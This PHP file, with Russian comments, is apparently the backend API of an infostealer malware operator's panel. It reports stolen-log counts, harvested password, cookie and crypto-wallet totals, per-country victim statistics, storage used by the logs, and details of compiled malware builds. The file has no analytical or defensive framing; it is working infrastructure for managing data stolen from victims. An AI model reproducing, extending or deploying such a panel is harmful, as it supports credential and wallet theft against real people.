<?php

include_once "../../config.php";
include_once "../app/functions.php";
include_once "../app/managers/AccountManager.php";

session_start();
header('Content-Type: application/json; charset=utf-8');

$link = ConnectDB();

$accountManager = new AccountManager($link);
$accountManager->CheckAuth();

$method                 = isset($_POST["method"]) ? $_POST["method"] : null;

$page                   = isset($_POST['page']) ? intval($_POST['page']) : 0;
$draw                   = isset($_POST['draw']) ? intval($_POST['draw']) : 0;
$start                  = isset($_POST['start']) ? intval($_POST['start']) : 0;
$length                 = isset($_POST['length']) ? intval($_POST['length']) : 10;

$theme                  = isset($_POST['theme']) ? intval($_POST['theme']) : 0;

/**
 * check actions
 */
if($method != null)
{
    switch($method)
    {
        case "get_stats":
            getStats($link);
            break;

        case "get_countries":
            getCountries($link, $page, $draw, $start, $length);
            break;

        case "get_build":
            getBuild($link);
            break;

        case "change_theme":
            ChangeTheme($link, $theme);
            break;

        default:
            echo json_encode(['error' => 'Unknown method']);
            exit(0);
            break;
    }
}

function getStats($mysqli)
{
    header('Content-Type: application/json');

    // Инициализируем массив условий для SQL-запроса
    $conditions = [];

    // Обработка $parse_builds, если $_SESSION['builds'] установлена и не пуста
    if (isset($_SESSION['builds']) && strlen($_SESSION['builds']) > 0) {
        $parse_builds = $_SESSION['builds'];

        // Если требуется дополнительная фильтрация (например, удаление лишних пробелов)
        $allowedArray = array_map('trim', explode(',', $parse_builds));
        // Здесь можно добавить дополнительную логику проверки, если список разрешённых билдов отличается

        // Экранируем значения с помощью $mysqli->real_escape_string
        $builds = array_map(
            function($b) use ($mysqli) {
                return $mysqli->real_escape_string(trim($b));
            },
            explode(',', $parse_builds)
        );

        $inBuilds = "'" . implode("','", $builds) . "'";
        $conditions[] = "`build` IN ({$inBuilds})";
    } 

    // Базовый SQL-запрос для получения логов за последние 48 часов, сгруппированных по часу
    $query = "
        SELECT DATE_FORMAT(date, '%Y-%m-%d %H:00:00') AS hour, COUNT(*) AS count
        FROM logs
        WHERE date >= NOW() - INTERVAL 7 DAY
    ";

    // Если есть дополнительные условия, добавляем их в запрос
    if (!empty($conditions)) {
        $query .= " AND " . implode(" AND ", $conditions);
    }

    $query .= " GROUP BY hour ORDER BY hour";

    $result = $mysqli->query($query);

    $chartData = [];
    $total_logs = 0;

    while ($row = $result->fetch_assoc()) {
        $total_logs += (int)$row['count'];
        $chartData[] = [
            'hour' => $row['hour'],
            'count' => (int)$row['count']
        ];
    }

    if (isset($_SESSION['builds']) && strlen($_SESSION['builds']) > 0) 
    {
        echo json_encode([
            'chartData' => $chartData,
            'build' => $_SESSION['builds'],
            'version' => "2.0.0",
            'logs_count_two_days' => $total_logs,
            'logs_count' => getLogsCount($mysqli),
            'passwords_count' => getPasswordsCount($mysqli),
            'cookies_count' => getCookiesCount($mysqli),
            'wallets_count' => getWalletsCount($mysqli)
        ]);
    }
    else
    {
        echo json_encode([
            'chartData' => $chartData,
            'free_space' => getFreeSpace(),
            'using_space' => getUsingSpace(),
            'logs_count_two_days' => $total_logs,
            'logs_count' => getLogsCount($mysqli),
            'passwords_count' => getPasswordsCount($mysqli),
            'cookies_count' => getCookiesCount($mysqli),
            'wallets_count' => getWalletsCount($mysqli)
        ]);
    }
}

/**
 * getLogsCount
 *
 * Calculate logs count
 *
 * @param $link
 * @return count of logs
 */
function getLogsCount($link)
{
    $count = 0;
    
    $query = "SELECT COUNT(*) FROM `logs`";
    
    if (isset($_SESSION['builds']) && strlen(trim($_SESSION['builds'])) > 0) 
    {
        $build = $link->real_escape_string(trim($_SESSION['builds']));
        $query .= " WHERE `build` = '$build'";
    }
    
    $query .= ";";
    
    if ($stmt = $link->prepare($query)) 
    {
        $stmt->execute();
        $stmt->store_result();

        if ($stmt->num_rows > 0) 
        {
            $stmt->bind_result($count);
            $stmt->fetch();
        } 
        else 
        {
            return 0;
        }
    }
    
    return $count;
}

/**
 * getPasswordsCount
 *
 * Get passwords count
 *
 * @param $link
 * @return int
 */
function getPasswordsCount($link)
{
    $count = 0;
	
	$query = "SELECT SUM(count_passwords) AS total_requests FROM logs";

    if (isset($_SESSION['builds']) && strlen(trim($_SESSION['builds'])) > 0) 
    {
        $build = $link->real_escape_string(trim($_SESSION['builds']));
        $query .= " WHERE `build` = '$build'";
    }
	
	if ($stmt = $link->prepare($query)) 
	{
		$stmt->execute();
		
		$stmt->store_result();
		
		if ($stmt->num_rows > 0)
		{
			$stmt->bind_result($count);
			$stmt->fetch();
		}
		else
		{
			return 0;
		}
	}

    if(isset($count))
    {
        return $count;
    }
    else
    {
        return 0;
    }
}

/**
 * getCookiesCount
 *
 * Get cookies count
 *
 * @param $link
 * @return int
 */
function getCookiesCount($link)
{
    $count = 0;
	
	$query = "SELECT SUM(count_cookies) AS total_requests FROM logs";

    if (isset($_SESSION['builds']) && strlen(trim($_SESSION['builds'])) > 0) 
    {
        $build = $link->real_escape_string(trim($_SESSION['builds']));
        $query .= " WHERE `build` = '$build'";
    }
	
	if ($stmt = $link->prepare($query)) 
	{
		$stmt->execute();
		
		$stmt->store_result();
		
		if ($stmt->num_rows > 0)
		{
			$stmt->bind_result($count);
			$stmt->fetch();
		}
		else
		{
			return 0;
		}
	}

    if(isset($count))
    {
        return $count;
    }
    else
    {
        return 0;
    }
}

/**
 * getWalletsCount
 *
 * Get wallets count
 *
 * @param $link
 * @return int
 */
function getWalletsCount($link)
{
    $count = 0;
	
	$query = "SELECT SUM(count_wallets) AS total_requests FROM logs";

    if (isset($_SESSION['builds']) && strlen(trim($_SESSION['builds'])) > 0) 
    {
        $build = $link->real_escape_string(trim($_SESSION['builds']));
        $query .= " WHERE `build` = '$build'";
    }
	
	if ($stmt = $link->prepare($query)) 
	{
		$stmt->execute();
		
		$stmt->store_result();
		
		if ($stmt->num_rows > 0)
		{
			$stmt->bind_result($count);
			$stmt->fetch();
		}
		else
		{
			return 0;
		}
	}

    if(isset($count))
    {
        return $count;
    }
    else
    {
        return 0;
    }
}


function getCountries($link, $page, $draw, $start, $length)
{
    // Формирование условий для фильтрации по builds, если $_SESSION['builds'] установлена и не пуста
    $conditions = [];
    if (isset($_SESSION['builds']) && strlen($_SESSION['builds']) > 0) {
        $parse_builds = $_SESSION['builds'];
        $builds = array_map(function($b) use ($link) {
            return $link->real_escape_string(trim($b));
        }, explode(',', $parse_builds));
        $inBuilds = "'" . implode("','", $builds) . "'";
        $conditions[] = "`build` IN ({$inBuilds})";
    }

    // Формирование WHERE-клаузы, если есть условия фильтрации
    $whereClause = '';
    if (!empty($conditions)) {
        $whereClause = " WHERE " . implode(" AND ", $conditions);
    }

    // Запрос для получения общего количества уникальных стран с учётом фильтрации
    $countQuery = "SELECT COUNT(*) AS total FROM (SELECT iso FROM logs" . $whereClause . " GROUP BY iso) AS grouped_logs";
    $countResult = $link->query($countQuery);
    $totalRecords = 0;
    if ($countResult) {
        $row = $countResult->fetch_assoc();
        $totalRecords = (int)$row['total'];
    }

    // Основной запрос для получения статистики с пагинацией и учетом фильтрации по builds
    $query = "SELECT iso, COUNT(*) AS visits 
              FROM logs" . $whereClause . " 
              GROUP BY iso 
              ORDER BY visits DESC 
              LIMIT {$start}, {$length}";
    $result = $link->query($query);

    if (!$result) {
        die("Ошибка выполнения запроса: " . $link->error);
    }

    $data = [];
    while ($row = $result->fetch_assoc()) {
        $row['id'] = $row['iso'];
        $data[] = $row;
    }

    $total_pages = ($length > 0) ? ceil($totalRecords / $length) : 0;

    $response = [
        "draw"            => $draw,
        "recordsTotal"    => $totalRecords,
        "recordsFiltered" => $totalRecords,
        "current_page"    => $page,
        "total_pages"     => $total_pages,
        "data"            => $data
    ];

    echo json_encode($response);
    exit();
}


/**
 * getFreeSpace
 *
 * free space getter
 *
 * @return free space size
 */
function getFreeSpace()
{
	$bytes = disk_free_space("."); 
	$si_prefix = array( 'b', 'kb', 'mb', 'gb', 'tb', 'eb', 'zb', 'yb' );
	$base = 1024;
	$class = min((int)log($bytes , $base) , count($si_prefix) - 1);
	
	return sprintf('%1.1f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class];
}

/**
 * getUsingSpace
 *
 * using space getter
 *
 * @return using space size
 */
function getUsingSpace()
{
	$dirname = "../../".LOGS_PATH."/";
	$size = dir_size($dirname);
	$formSize = format_size($size);
	
	return $formSize;
}

/**
 * dir_size
 *
 * 
 */
function dir_size($dirname)
{
	$totalsize=0;
	
	if ($dirstream = @opendir($dirname))
	{
		while (false !== ($filename = readdir($dirstream))) 
		{
			if ($filename!="." && $filename!="..")
			{
				if (is_file($dirname."/".$filename))
					$totalsize+=filesize($dirname."/".$filename);
				
				if (is_dir($dirname."/".$filename))
					$totalsize+=dir_size($dirname."/".$filename);
			}
		}

        closedir($dirstream);
	}
	
	return $totalsize;
}

/**
 * dir_size
 *
 * 
 */
function format_size($size)
{
	$metrics[0] = 'B';
	$metrics[1] = 'KB';
	$metrics[2] = 'MB';
	$metrics[3] = 'GB';
	$metrics[4] = 'TB';
	$metric = 0;         
	
	while(floor($size/1024) > 0)
	{
		++$metric;
		$size /= 1024;
	}
	
	$ret =  round($size,1)." ".(isset($metrics[$metric])?$metrics[$metric]:'??');
	
	return $ret;
}

function getBuild($link)
{
    $name = mysqli_real_escape_string($link, $_SESSION["builds"]);
    $build = $link->query("SELECT * FROM `builds` WHERE `name`='$name'")->fetch_array();

    if($build != null)
    {
        $data["build"]          = $_SESSION["builds"];
        $data["password"]       = $build["password"];
        $data["last_compile"]   = $build["last_compile"];
        $data["version"]        = $build["version"];

        echo json_encode(['success' => true, 'data' => $data]);
    }
    else
    {
        echo json_encode(['error' => 'Build not found']);
        exit();
    }
}

function ChangeTheme($link, $theme)
{
    $user_id = $_SESSION['user_id'];
    $_SESSION["theme"] = $theme;

    $stmt = $link->prepare("UPDATE users SET theme = ? WHERE id = ?");

    if (!$stmt) 
    {
        echo json_encode(['error' => 'Error preparing UPDATE']);
        exit();
    }

    $stmt->bind_param("ii", $theme, $user_id);

    if (!$stmt->execute()) 
    {
        echo json_encode(['error' => 'Error executing UPDATE']);
        exit();
    }
    
    $stmt->close();

    echo json_encode(['success' => 'Theme changed']);
    exit();
}

?>